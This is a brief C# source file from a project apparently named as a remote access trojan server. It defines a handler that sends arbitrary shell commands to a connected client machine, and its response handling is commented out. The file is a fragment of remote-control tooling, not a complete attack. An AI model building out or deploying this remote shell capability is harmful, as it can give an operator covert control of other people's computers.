using RatatooeyServer.ProtoMessages;
using RatatooeyServer.Server;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RatatooeyServer.Helpers
{
	public class RemoteShellHandler
	{
		private Client _client;

		public RemoteShellHandler(Client client)
		{
			_client = client;
		}


		public void SendCommand(string command)
		{
			RemoteShellExec rmt = new RemoteShellExec();
			rmt.Command = command;
			_client.SendData(rmt);
		}

		private void Execute(RemoteShellResponse message)
		{
			//if (message.IsError)
			//	OnCommandError(message.Output);
			//else
			//	OnReport(message.Output);
		}
	}
}
